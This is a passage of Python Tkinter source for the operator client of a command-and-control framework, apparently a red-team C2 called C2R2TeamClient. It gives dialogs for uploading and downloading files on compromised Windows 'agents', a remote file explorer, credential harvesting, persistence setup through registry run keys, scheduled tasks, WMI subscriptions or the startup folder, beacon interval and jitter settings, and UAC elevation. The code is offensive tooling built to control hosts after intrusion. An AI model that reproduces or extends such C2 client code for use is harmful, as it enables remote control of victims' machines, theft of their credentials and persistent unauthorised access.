        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
    
    def _context_upload_file(self):
        """Upload file from context menu."""
        if not self.context_menu_agent_id:
            return
        
        # Select local file
        local_path = filedialog.askopenfilename(
            title="Select File to Upload",
            filetypes=[("All Files", "*.*")]
        )
        if not local_path:
            return
        
        # Create dialog for remote path input
        dialog = tk.Toplevel(self.root)
        dialog.title(f"Upload File to Agent {self.context_menu_agent_id}")
        dialog.geometry("500x180")
        dialog.configure(bg=self.colors['bg'])
        dialog.transient(self.root)
        dialog.grab_set()
        
        ttk.Label(dialog, text=f"Local file: {Path(local_path).name}", 
                 style='Dark.TLabel', font=('Consolas', 10)).pack(pady=10)
        
        ttk.Label(dialog, text="Enter remote path (destination):", style='Dark.TLabel').pack(pady=5)
        
        path_entry = tk.Entry(dialog, width=60, bg=self.colors['input_bg'], 
                             fg=self.colors['fg'], font=('Consolas', 11))
        path_entry.pack(pady=10, padx=20)
        path_entry.insert(0, f"C:\\Users\\Public\\{Path(local_path).name}")
        path_entry.focus()
        path_entry.select_range(0, tk.END)
        
        def upload():
            remote_path = path_entry.get().strip()
            if remote_path:
                self._upload_file(self.context_menu_agent_id, local_path, remote_path)
                dialog.destroy()
        
        path_entry.bind('<Return>', lambda e: upload())
        
        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="Upload", bg=self.colors['accent'], fg='white',
                 relief=tk.FLAT, command=upload, padx=20).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
    
    def _context_file_explorer(self):
        """Open file explorer for agent."""
        if not self.context_menu_agent_id:
            return
        
        # Check if already open
        if self.context_menu_agent_id in self.file_explorer_windows:
            window = self.file_explorer_windows[self.context_menu_agent_id]
            if window.winfo_exists():
                window.lift()
                return
        
        # Create file explorer window
        explorer = tk.Toplevel(self.root)
        explorer.title(f"File Explorer - Agent {self.context_menu_agent_id}")
        explorer.geometry("900x600")
        explorer.configure(bg=self.colors['bg'])
        
        self.file_explorer_windows[self.context_menu_agent_id] = explorer
        
        # Store references for WebSocket updates
        self.file_explorer_data[self.context_menu_agent_id] = {
            'tree': None,  # Will be set after tree creation
            'path_var': None,
            'status_var': None
        }
        
        # Top bar with path navigation
        nav_frame = tk.Frame(explorer, bg=self.colors['panel_bg'])
        nav_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(nav_frame, text="Path:", style='Panel.TLabel').pack(side=tk.LEFT, padx=5)
        
        path_var = tk.StringVar(value="C:")
        self.file_explorer_data[self.context_menu_agent_id]['path_var'] = path_var
        path_entry = tk.Entry(nav_frame, textvariable=path_var, bg=self.colors['input_bg'],
                             fg=self.colors['fg'], font=('Consolas', 10))
        path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        def browse_path():
            path = path_var.get().strip()
            if path:
                load_directory(path)
        
        path_entry.bind('<Return>', lambda e: browse_path())
        
        tk.Button(nav_frame, text="Go", bg=self.colors['accent'], fg='white',
                 relief=tk.FLAT, command=browse_path, padx=15).pack(side=tk.LEFT, padx=2)
        
        tk.Button(nav_frame, text="Up", bg=self.colors['info'], fg='white',
                 relief=tk.FLAT, command=lambda: go_up(), padx=15).pack(side=tk.LEFT, padx=2)
        
        tk.Button(nav_frame, text="Refresh", bg=self.colors['success'], fg='white',
                 relief=tk.FLAT, command=lambda: load_directory(path_var.get()), 
                 padx=15).pack(side=tk.LEFT, padx=2)
        
        # Treeview for files
        tree_frame = tk.Frame(explorer, bg=self.colors['panel_bg'])
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        columns = ('Name', 'Type', 'Size', 'Modified')
        file_tree = ttk.Treeview(tree_frame, columns=columns, show='headings',
                                style='Dark.Treeview')
        
        file_tree.heading('Name', text='Name')
        file_tree.heading('Type', text='Type')
        file_tree.heading('Size', text='Size')
        file_tree.heading('Modified', text='Modified')
        
        file_tree.column('Name', width=400)
        file_tree.column('Type', width=100)
        file_tree.column('Size', width=120)
        file_tree.column('Modified', width=180)
        
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=file_tree.yview)
        file_tree.configure(yscrollcommand=scrollbar.set)
        
        file_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Store tree reference for WebSocket updates
        self.file_explorer_data[self.context_menu_agent_id]['tree'] = file_tree
        
        # Status bar
        status_var = tk.StringVar(value="Ready")
        self.file_explorer_data[self.context_menu_agent_id]['status_var'] = status_var
        status_bar = ttk.Label(explorer, textvariable=status_var, style='Panel.TLabel',
                              relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(fill=tk.X, padx=5, pady=2)
        
        # Context menu for file operations
        file_context_menu = tk.Menu(explorer, tearoff=0, bg=self.colors['panel_bg'],
                                   fg=self.colors['fg'], activebackground=self.colors['accent'],
                                   activeforeground='white')
        file_context_menu.add_command(label="📥 Download", 
                                     command=lambda: download_selected())
        file_context_menu.add_command(label="📤 Upload Here...",
                                     command=lambda: upload_to_current())
        file_context_menu.add_separator()
        file_context_menu.add_command(label="🔄 Refresh", 
                                     command=lambda: load_directory(path_var.get()))
        
        def show_file_context(event):
            try:
                file_context_menu.tk_popup(event.x_root, event.y_root)
            finally:
                file_context_menu.grab_release()
        
        file_tree.bind('<Button-3>', show_file_context)
        
        # Double-click to navigate or download
        def on_double_click(event):
            selection = file_tree.selection()
            if not selection:
                return
            
            item = selection[0]
            values = file_tree.item(item)['values']
            name = values[0]
            # values[3] contains 'D' for directory or 'F' for file
            is_directory = (len(values) > 3 and values[3] == 'D') or '📁' in str(values[1])
            
            current_path = path_var.get().rstrip('\\\\//')
            
            if is_directory:
                # Navigate into directory
                new_path = f"{current_path}\\{name}"
                path_var.set(new_path)
                load_directory(new_path)
            else:
                # Download file
                full_path = f"{current_path}\\{name}"
                download_file_path(full_path)
        
        file_tree.bind('<Double-1>', on_double_click)
        
        def go_up():
            current = path_var.get().rstrip('\\\\//')
            parent = str(Path(current).parent)
            if parent and parent != current:
                path_var.set(parent)
                load_directory(parent)
        
        def load_directory(dir_path):
            status_var.set(f"Loading {dir_path}...")
            explorer.update()
            
            self.logger.info(f"Loading directory: {dir_path}")
            
            # Clear current items
            for item in file_tree.get_children():
                file_tree.delete(item)
            
            # Fix path format - remove trailing backslash except for root
            clean_path = dir_path.rstrip('\\\\//')
            if len(clean_path) == 2 and clean_path[1] == ':':
                # It's a root like C: - add backslash
                list_path = clean_path + '\\\\'
            else:
                list_path = clean_path
            
            self.logger.debug(f"File explorer listing: {list_path}")
            
            def list_thread():
                success, message = self.api.list_directory(
                    self.context_menu_agent_id,
                    list_path
                )
                
                if success:
                    self.logger.info(f"Directory listing sent for {dir_path}")
                    explorer.after(100, lambda: status_var.set(f"Loaded {dir_path}"))
                    # The output will come via WebSocket event as __DIRLIST__
                    # We'll need to parse it when it arrives
                else:
                    self.logger.error(f"Failed to list directory: {message}")
                    explorer.after(0, lambda: status_var.set(f"Error: {message}"))
            
            threading.Thread(target=list_thread, daemon=True).start()
        
        def download_selected():
            selection = file_tree.selection()
            if not selection:
                return
            
            item = selection[0]
            values = file_tree.item(item)['values']
            name = values[0]
            # values[3] contains 'D' for directory or 'F' for file
            is_directory = (len(values) > 3 and values[3] == 'D') or '📁' in str(values[1])
            
            if is_directory:
                status_var.set("Cannot download directories")
                return
            
            current_path = path_var.get().rstrip('\\\\//')
            full_path = f"{current_path}\\{name}"
            download_file_path(full_path)
        
        def download_file_path(file_path):
            status_var.set(f"Downloading {Path(file_path).name}...")
            
            def dl_thread():
                success, message = self.api.download_file(self.context_menu_agent_id, file_path)
                if success:
                    explorer.after(0, lambda: status_var.set(f"Download started: {Path(file_path).name}"))
                else:
                    explorer.after(0, lambda: status_var.set(f"Error: {message}"))
            
            threading.Thread(target=dl_thread, daemon=True).start()
        
        def upload_to_current():
            local_path = filedialog.askopenfilename(
                title="Select File to Upload",
                filetypes=[("All Files", "*.*")]
            )
            if not local_path:
                return
            
            current_path = path_var.get().rstrip('\\\\//')
            remote_path = f"{current_path}\\{Path(local_path).name}"
            
            status_var.set(f"Uploading {Path(local_path).name}...")
            
            def ul_thread():
                success, message = self.api.upload_file(
                    self.context_menu_agent_id, 
                    local_path, 
                    remote_path
                )
                if success:
                    explorer.after(0, lambda: status_var.set(f"Upload started: {Path(local_path).name}"))
                    explorer.after(500, lambda: load_directory(path_var.get()))
                else:
                    explorer.after(0, lambda: status_var.set(f"Error: {message}"))
            
            threading.Thread(target=ul_thread, daemon=True).start()
        
        # Load initial directory
        load_directory("C:\\")
        
        # Cleanup on close
        def on_close():
            if self.context_menu_agent_id in self.file_explorer_windows:
                del self.file_explorer_windows[self.context_menu_agent_id]
            explorer.destroy()
        
        explorer.protocol("WM_DELETE_WINDOW", on_close)
    
    def _context_harvest(self):
        """Harvest credentials from context menu."""
        if self.context_menu_agent_id:
            self._harvest_credentials(self.context_menu_agent_id)
    
    def _context_persistence(self):
        """Set persistence from context menu."""
        if not self.context_menu_agent_id:
            return
        
        # Create dialog for persistence method selection
        dialog = tk.Toplevel(self.root)
        dialog.title(f"Set Persistence on Agent {self.context_menu_agent_id}")
        dialog.geometry("400x250")
        dialog.configure(bg=self.colors['bg'])
        dialog.transient(self.root)
        dialog.grab_set()
        
        ttk.Label(dialog, text="Select persistence method:", style='Dark.TLabel',
                 font=('Consolas', 12, 'bold')).pack(pady=15)
        
        method_var = tk.StringVar(value="registry")
        
        methods = [
            ("registry", "Registry Run Key"),
            ("task", "Scheduled Task"),
            ("wmi", "WMI Event Subscription"),
            ("startup", "Startup Folder")
        ]
        
        for value, label in methods:
            tk.Radiobutton(dialog, text=label, variable=method_var, value=value,
                          bg=self.colors['bg'], fg=self.colors['fg'], 
                          selectcolor=self.colors['panel_bg'],
                          activebackground=self.colors['bg'],
                          activeforeground=self.colors['accent'],
                          font=('Consolas', 10)).pack(anchor=tk.W, padx=40, pady=5)
        
        def set_persist():
            method = method_var.get()
            self._set_persistence(self.context_menu_agent_id, method)
            dialog.destroy()
        
        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
        btn_frame.pack(pady=15)
        
        tk.Button(btn_frame, text="Set Persistence", bg=self.colors['accent'], fg='white',
                 relief=tk.FLAT, command=set_persist, padx=20).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
    
    def _context_beacon(self):
        """Configure beacon from context menu."""
        if not self.context_menu_agent_id:
            return
        
        # Create dialog for beacon configuration
        dialog = tk.Toplevel(self.root)
        dialog.title(f"Configure Beacon for Agent {self.context_menu_agent_id}")
        dialog.geometry("400x200")
        dialog.configure(bg=self.colors['bg'])
        dialog.transient(self.root)
        dialog.grab_set()
        
        ttk.Label(dialog, text="Beacon Configuration", style='Dark.TLabel',
                 font=('Consolas', 12, 'bold')).pack(pady=15)
        
        form_frame = tk.Frame(dialog, bg=self.colors['bg'])
        form_frame.pack(pady=10)
        
        ttk.Label(form_frame, text="Interval (seconds):", style='Dark.TLabel').grid(
            row=0, column=0, sticky='e', padx=5, pady=5)
        interval_entry = tk.Entry(form_frame, width=15, bg=self.colors['input_bg'], 
                                 fg=self.colors['fg'])
        interval_entry.grid(row=0, column=1, padx=5, pady=5)
        interval_entry.insert(0, "60")
        
        ttk.Label(form_frame, text="Jitter (seconds):", style='Dark.TLabel').grid(
            row=1, column=0, sticky='e', padx=5, pady=5)
        jitter_entry = tk.Entry(form_frame, width=15, bg=self.colors['input_bg'], 
                               fg=self.colors['fg'])
        jitter_entry.grid(row=1, column=1, padx=5, pady=5)
        jitter_entry.insert(0, "30")
        
        def configure():
            try:
                interval = int(interval_entry.get().strip())
                jitter = int(jitter_entry.get().strip())
                self._configure_beacon(self.context_menu_agent_id, interval, jitter)
                dialog.destroy()
            except ValueError:
                messagebox.showerror("Invalid Input", "Please enter valid numbers")
        
        btn_frame = tk.Frame(dialog, bg=self.colors['bg'])
        btn_frame.pack(pady=15)
        
        tk.Button(btn_frame, text="Configure", bg=self.colors['accent'], fg='white',
                 relief=tk.FLAT, command=configure, padx=20).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", bg=self.colors['panel_bg'], fg=self.colors['fg'],
                 relief=tk.FLAT, command=dialog.destroy, padx=20).pack(side=tk.LEFT, padx=5)
    
    def _context_elevate(self):
        """Elevate agent from context menu."""
        if self.context_menu_agent_id:
            # Show confirmation dialog
            result = messagebox.askyesno(
                "Elevate to Admin",
                f"Attempt to elevate Agent {self.context_menu_agent_id} to Administrator?\n\n"
                "This will trigger a UAC prompt on the target machine.",
                icon='warning'
            )
            if result:
                self._elevate_agent(self.context_menu_agent_id)
    
    def _on_close(self):
        """Handle window close."""
        self.logger.info("Application closing...")
        self.running = False
        self.api.disconnect()
        self.ssh_tunnel.disconnect()
        self.logger.info("Connections closed. Goodbye!")
        self.root.destroy()
    
    def run(self):
        """Start the application."""
        self.root.mainloop()


def main():
    """Main entry point."""
    app = C2R2TeamClient()
    app.run()


if __name__ == "__main__":
    main()
